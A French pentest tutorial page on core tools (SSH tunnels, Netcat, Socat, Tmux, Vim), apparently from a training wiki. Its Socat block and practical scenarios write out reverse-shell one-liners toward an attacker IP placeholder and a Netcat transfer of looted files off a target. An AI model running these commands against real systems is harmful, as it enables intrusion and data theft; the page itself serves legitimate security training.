# Outils essentiels

Quelques outils reviennent dans chaque phase d'un pentest, quel que soit le perimetre. SSH pour les connexions distantes, Netcat pour les interactions reseau brutes, Tmux pour gerer plusieurs terminaux, et un editeur en ligne de commande pour modifier des fichiers directement sur la cible. Maitriser ces fondamentaux fait gagner un temps considerable.

## Pourquoi

Ces outils sont presents sur la quasi-totalite des systemes Linux. Les connaitre permet de travailler efficacement meme dans un environnement minimal, sans interface graphique, avec un shell limite ou sur un systeme ou rien d'autre n'est installe.

## Comment ca marche

### SSH (Secure Shell)

SSH est le protocole standard pour les connexions distantes securisees. Il chiffre l'integralite de la communication (authentification, commandes, transfert de fichiers).

Les usages principaux en pentest sont la connexion a une cible compromise, l'execution de commandes distantes, le transfert de fichiers et la creation de tunnels pour pivoter dans un reseau.

```bash
# - Connexion basique
ssh utilisateur@<IP_CIBLE>

# - Connexion avec cle privee
ssh -i id_rsa utilisateur@<IP_CIBLE>

# - Connexion sur un port non standard
ssh -p 2222 utilisateur@<IP_CIBLE>

# - Execution d'une commande a distance
ssh utilisateur@<IP_CIBLE> 'id && hostname'
```

#### Tunnels SSH

SSH permet de creer des tunnels pour rediriger le trafic reseau a travers une connexion chiffree. C'est un outil de pivoting courant.

{% tabs %}
{% tab title="Local Port Forwarding" %}
Redirige un port local vers un service accessible depuis la cible.

```bash
# - Le port 8080 local pointe vers le port 80 de 192.168.1.10 via la cible
ssh -L 8080:192.168.1.10:80 utilisateur@<IP_CIBLE>
```
{% endtab %}
{% tab title="Dynamic Port Forwarding" %}
Cree un proxy SOCKS sur un port local pour router tout le trafic via la cible.

```bash
# - Proxy SOCKS4 sur le port 9050
ssh -D 9050 utilisateur@<IP_CIBLE>
```
{% endtab %}
{% tab title="Remote Port Forwarding" %}
Expose un port de la machine locale sur la cible distante.

```bash
# - Le port 8443 de la cible pointe vers le port 443 local
ssh -R 8443:localhost:443 utilisateur@<IP_CIBLE>
```
{% endtab %}
{% endtabs %}

### Netcat

Netcat est l'outil reseau polyvalent par excellence. Il permet de lire et d'ecrire des donnees sur des connexions TCP ou UDP, d'ecouter sur un port, de recuperer des bannieres de services et de transferer des fichiers.

```bash
# - Banner grabbing sur un port
nc -nv <IP_CIBLE> 22

# - Ecouter sur un port (reverse shell listener)
nc -nlvp 4444

# - Se connecter a un bind shell
nc -nv <IP_CIBLE> 4444

# - Transfert de fichier (recepteur)
nc -nlvp 9999 > fichier_recu.txt

# - Transfert de fichier (emetteur)
nc -nv <IP_CIBLE> 9999 < fichier_a_envoyer.txt
```

| Option | Fonction |
|---|---|
| `-n` | Pas de resolution DNS |
| `-v` | Mode verbeux |
| `-l` | Mode ecoute (listen) |
| `-p` | Port a utiliser |
| `-u` | Mode UDP |
| `-e` | Executer un programme a la connexion (absent de certaines versions) |

{% hint style="info" %}
Socat est une alternative plus puissante a Netcat. Il supporte les connexions chiffrees (SSL), les redirections complexes et le mode interactif complet. La syntaxe est plus verbeuse mais les possibilites sont bien plus etendues.
{% endhint %}

```bash
# - Socat : reverse shell chiffre (listener)
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 STDOUT

# - Socat : reverse shell chiffre (cible)
socat OPENSSL:<IP_ATTAQUANT>:4444,verify=0 EXEC:/bin/bash
```

### Tmux

Tmux est un multiplexeur de terminal. Il permet de gerer plusieurs sessions dans un seul terminal, de detacher et rattacher des sessions, et de diviser l'ecran en panneaux. En pentest, il est indispensable pour garder un listener actif tout en travaillant dans un autre terminal.

#### Raccourcis essentiels

Le prefixe par defaut est `Ctrl+b`, suivi de la touche de commande.

| Raccourci | Action |
|---|---|
| `Ctrl+b` puis `c` | Creer une nouvelle fenetre |
| `Ctrl+b` puis `n` / `p` | Fenetre suivante / precedente |
| `Ctrl+b` puis `"` | Diviser horizontalement |
| `Ctrl+b` puis `%` | Diviser verticalement |
| `Ctrl+b` puis `d` | Detacher la session |
| `Ctrl+b` puis `[` | Mode copie (navigation avec les fleches) |
| `Ctrl+b` puis `&` | Fermer la fenetre courante |

```bash
# - Creer une session nommee
tmux new -s pentest

# - Lister les sessions actives
tmux ls

# - Rattacher une session detachee
tmux attach -t pentest
```

{% hint style="success" %}
Lancer un listener Netcat dans une fenetre Tmux dediee evite de le perdre si le terminal principal se ferme. La session Tmux persiste tant que le systeme tourne, meme apres deconnexion SSH.
{% endhint %}

### Vim

Vim est un editeur de texte en ligne de commande present sur pratiquement tous les systemes Unix. Savoir modifier un fichier de configuration ou un script directement sur la cible est une competence indispensable.

Vim fonctionne en trois modes principaux.

| Mode | Touche d'entree | Usage |
|---|---|---|
| **Normal** | `Esc` | Navigation, copier-coller, commandes |
| **Insertion** | `i` | Saisie de texte |
| **Commande** | `:` | Sauvegarde, quitter, recherche |

#### Commandes les plus utiles

| Commande | Action |
|---|---|
| `i` | Entrer en mode insertion |
| `Esc` | Revenir en mode normal |
| `:w` | Sauvegarder |
| `:q` | Quitter |
| `:wq` | Sauvegarder et quitter |
| `:q!` | Quitter sans sauvegarder |
| `dd` | Supprimer la ligne courante |
| `yy` | Copier la ligne courante |
| `p` | Coller apres le curseur |
| `/motif` | Rechercher un motif |
| `n` | Occurrence suivante |
| `:%s/ancien/nouveau/g` | Remplacer dans tout le fichier |

{% hint style="warning" %}
Si Vim n'est pas disponible sur la cible, `nano` est une alternative plus accessible. Sur les systemes minimalistes (conteneurs, systemes embarques), `vi` est souvent la seule option, et il fonctionne de la meme maniere que Vim pour les commandes de base.
{% endhint %}

## En pratique

### Scenario : prise de controle via reverse shell

```bash
# - Sur la machine attaquante : lancer un listener dans Tmux
tmux new -s listener
nc -nlvp 4444

# - Depuis la cible : envoyer un reverse shell
bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1

# - Sur la machine attaquante : stabiliser le shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Puis Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Scenario : recuperation de fichier via Netcat

```bash
# - Sur la machine attaquante (recepteur)
nc -nlvp 9999 > loot.tar.gz

# - Sur la cible (emetteur)
nc -nv <IP_ATTAQUANT> 9999 < /tmp/loot.tar.gz
```

## Pieges et galeres

- **Shell instable** : un reverse shell basique via Netcat n'a pas de TTY. Sans stabilisation (`python3 pty` + `stty raw`), les commandes comme `su`, `nano` ou `Ctrl+C` ne fonctionnent pas correctement
- **Netcat sans `-e`** : certaines versions de Netcat (OpenBSD) n'ont pas l'option `-e`. Utiliser un pipe nomme (`mkfifo`) ou passer par un one-liner bash
- **Session Tmux perdue** : si le terminal est ferme sans detacher (`Ctrl+b d`), la session continue de tourner. Un `tmux ls` suivi de `tmux attach -t nom` permet de la retrouver
- **Port deja utilise** : si un listener refuse de se lancer avec "Address already in use", verifier quel processus occupe le port avec `ss -tlnp | grep <port>` et le tuer si necessaire
- **SSH key permissions** : SSH refuse les cles privees avec des permissions trop larges. Toujours appliquer `chmod 600 id_rsa` avant de se connecter

## Memo express

| Outil | Usage principal | Commande de base |
|---|---|---|
| **SSH** | Connexion distante securisee | `ssh user@host` |
| **Netcat** | Interactions reseau brutes | `nc -nlvp 4444` (listener) |
| **Socat** | Netcat avance, SSL | `socat TCP-LISTEN:4444 STDOUT` |
| **Tmux** | Multiplexeur de terminal | `tmux new -s nom` |
| **Vim** | Editeur en ligne de commande | `vim fichier` puis `i` pour editer |

***
